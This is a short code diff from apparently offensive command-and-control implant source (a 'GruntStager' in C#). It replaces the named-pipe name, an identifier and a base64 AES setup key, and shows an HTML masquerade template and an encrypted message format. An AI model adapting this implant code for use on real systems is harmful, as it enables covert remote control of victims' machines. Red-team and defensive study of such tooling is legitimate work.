@@ -43,11 +43,11 @@ namespace GruntStager
         // Hello World! {0}
     </body>
 </html>".Replace(Environment.NewLine, "\n");
-                string PipeName = @"gruntsvc14";
+                string PipeName = @"gruntsvc03";
 
-                string aGUID = @"0905d17c68";
+                string aGUID = @"70561c0536";
                 string GUID = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10);
-                byte[] SetupKeyBytes = Convert.FromBase64String(@"53xXyOZ92Hb/mRWT/LLEUztUrzMUEVC8ap3twqhsuxc=");
+                byte[] SetupKeyBytes = Convert.FromBase64String(@"SEBqh69S3vGjX+UQJ2smFjZCXejp3X0pMPh7I7tEuYI=");
                 string MessageFormat = @"{{""GUID"":""{0}"",""Type"":{1},""Meta"":""{2}"",""IV"":""{3}"",""EncryptedMessage"":""{4}"",""HMAC"":""{5}""}}";
 
                 Aes SetupAESKey = Aes.Create();
